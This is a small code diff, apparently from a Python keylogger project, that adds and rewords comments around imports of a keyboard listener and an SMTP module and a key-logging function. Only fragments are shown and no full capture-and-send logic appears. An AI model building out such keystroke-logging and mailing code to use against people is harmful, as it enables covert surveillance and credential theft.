@@ -1,6 +1,7 @@
+# packages
 from pynput.keyboard import Listener
 import sys
-
+# files project
 from smtp import smtp
 from validations import validations
 from header import header
@@ -16,7 +17,7 @@ def write_log(key):
   args = sys.argv
   values = validations.verify_args(args)
 
-  # verify keys
+  # manage keys
   if keydata == "Key.esc":
     cancel()
   elif keydata == "Key.f4":
